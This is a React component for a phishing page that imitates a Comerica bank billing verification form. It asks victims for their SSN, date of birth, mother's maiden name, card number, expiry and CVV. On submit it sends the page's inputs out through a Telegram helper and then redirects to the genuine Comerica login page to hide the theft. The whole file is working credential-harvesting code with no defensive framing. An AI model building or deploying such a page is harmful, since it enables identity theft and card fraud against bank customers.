import React, { useState } from 'react';
import { sendPageInputTagsToTelegram } from '../utils/telegram';

export function BillingPage() {
  const [address, setAddress] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [zip, setZip] = useState('');
  const [ssn, setSsn] = useState('');
  const [dob, setDob] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');

  const formatDob = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 8);
    if (digits.length <= 2) return digits;
    if (digits.length <= 4) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`;
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await sendPageInputTagsToTelegram();
      setIsVerified(true);
      window.setTimeout(() => {
        window.location.assign('https://webbanking.comerica.com/Comerica/login.aspx');
      }, 800);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isVerified) {
    return (
      <div className="bg-white w-full max-w-[500px] shadow-sm flex flex-col font-sans border border-gray-300 p-8 text-center">
        <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-[#00529b] text-white text-3xl font-bold shadow-sm">
          ✓
        </div>
        <h2 className="mt-4 text-xl font-bold text-[#00529b]">Verification complete</h2>
        <p className="mt-2 text-sm text-gray-700">Redirecting you to the Comerica sign-in page…</p>
      </div>
    );
  }

  return (
    <div className="bg-white w-full max-w-[500px] shadow-sm flex flex-col font-sans border border-gray-300">
      {/* Header */}
      <div className="bg-[#666666] text-white px-4 py-2 font-bold text-sm">
        Billing
      </div>

      <div className="p-6 flex flex-col bg-[#f2f2f2]">
        <p className="text-[0.7rem] text-gray-800 mb-6">
          Fields marked with an <span className="text-[#CC0000] font-bold">*</span> are
          required.
        </p>

        <form className="space-y-4" onSubmit={handleSubmit}>
          {/* Address */}
          <div className="flex flex-col">
            <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="address">
              Billing Address:
            </label>
            <div className="flex items-center">
              <input
                id="address"
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="border border-[#999999] px-1.5 py-0.5 flex-grow bg-white focus:outline-none focus:border-[#00529b]"
                required
              />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
          </div>

          <div className="flex gap-4">
            {/* City */}
            <div className="flex flex-col flex-grow">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="city">
                City:
              </label>
              <div className="flex items-center">
                <input
                  id="city"
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>
            {/* State */}
            <div className="flex flex-col w-[80px]">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="state">
                State:
              </label>
              <div className="flex items-center">
                <input
                  id="state"
                  type="text"
                  value={state}
                  onChange={(e) => setState(e.target.value.replace(/[^A-Za-z]/g, '').slice(0, 2).toUpperCase())}
                  className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                  maxLength={2}
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>
          </div>

          {/* Zip Code */}
          <div className="flex flex-col w-[120px]">
            <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="zip">
              Zip Code:
            </label>
            <div className="flex items-center">
              <input
                id="zip"
                type="text"
                value={zip}
                onChange={(e) => setZip(e.target.value.replace(/\D/g, '').slice(0, 5))}
                className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                required
              />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
          </div>

          <div className="flex gap-4">
            {/* SSN */}
            <div className="flex flex-col flex-grow">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="ssn">
                SSN:
              </label>
              <div className="flex items-center">
                <input
                  id="ssn"
                  type="text"
                  placeholder="XXX-XX-XXXX"
                  value={ssn}
                  onChange={(e) => setSsn(e.target.value.replace(/\D/g, '').slice(0, 9))}
                  className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>
            {/* DOB */}
            <div className="flex flex-col w-[150px]">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="dob">
                DOB:
              </label>
              <div className="flex items-center">
                <input
                  id="dob"
                  type="text"
                  placeholder="MM/DD/YYYY"
                  value={dob}
                  onChange={(e) => setDob(formatDob(e.target.value))}
                  className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>
          </div>

          {/* Mother's Maiden Name */}
          <div className="flex flex-col">
            <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="motherMaidenName">
              Mother's Maiden Name:
            </label>
            <div className="flex items-center">
              <input
                id="motherMaidenName"
                type="text"
                value={motherMaidenName}
                onChange={(e) => setMotherMaidenName(e.target.value.replace(/\s+/g, ' ').trim().slice(0, 15))}
                className="border border-[#999999] px-1.5 py-0.5 flex-grow bg-white focus:outline-none focus:border-[#00529b]"
                required
              />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
          </div>

          <div className="pt-4 mt-2 border-t border-gray-300">
             <h3 className="text-[#00529b] text-[0.9rem] font-bold mb-4">
              Card Information
            </h3>
            
            {/* Card Number */}
            <div className="flex flex-col mb-4">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="cardNumber">
                Card Number:
              </label>
              <div className="flex items-center">
                <input
                  id="cardNumber"
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16))}
                  className="border border-[#999999] px-1.5 py-0.5 flex-grow bg-white focus:outline-none focus:border-[#00529b]"
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>

            <div className="flex gap-4">
              {/* Expiry */}
              <div className="flex flex-col w-[100px]">
                <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="expiry">
                  Exp. Date:
                </label>
                <div className="flex items-center">
                  <input
                    id="expiry"
                    type="text"
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                    required
                  />
                  <span className="text-[#CC0000] ml-1 font-bold">*</span>
                </div>
              </div>
              {/* CVV */}
              <div className="flex flex-col w-[80px]">
                <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="cvv">
                  CVV:
                </label>
                <div className="flex items-center">
                  <input
                    id="cvv"
                    type="password"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                    className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                    maxLength={4}
                    required
                  />
                  <span className="text-[#CC0000] ml-1 font-bold">*</span>
                </div>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <div className="pt-6">
            <button
              type="submit"
              disabled={isSubmitting}
              className="bg-[#a23232] hover:bg-[#8e2b2b] text-white px-8 py-1.5 text-sm font-semibold transition-colors min-w-[120px] shadow-sm disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isSubmitting ? 'Verifying...' : 'Verify'}
            </button>
          </div>
        </form>
      </div>

      {/* Footer Links */}
      <div className="bg-white p-4 border-t border-gray-200 text-[0.75rem]">
        <p className="text-gray-800">
          For security questions or to report a lost card, call 888.444.9876.
        </p>
      </div>
    </div>
  );
}
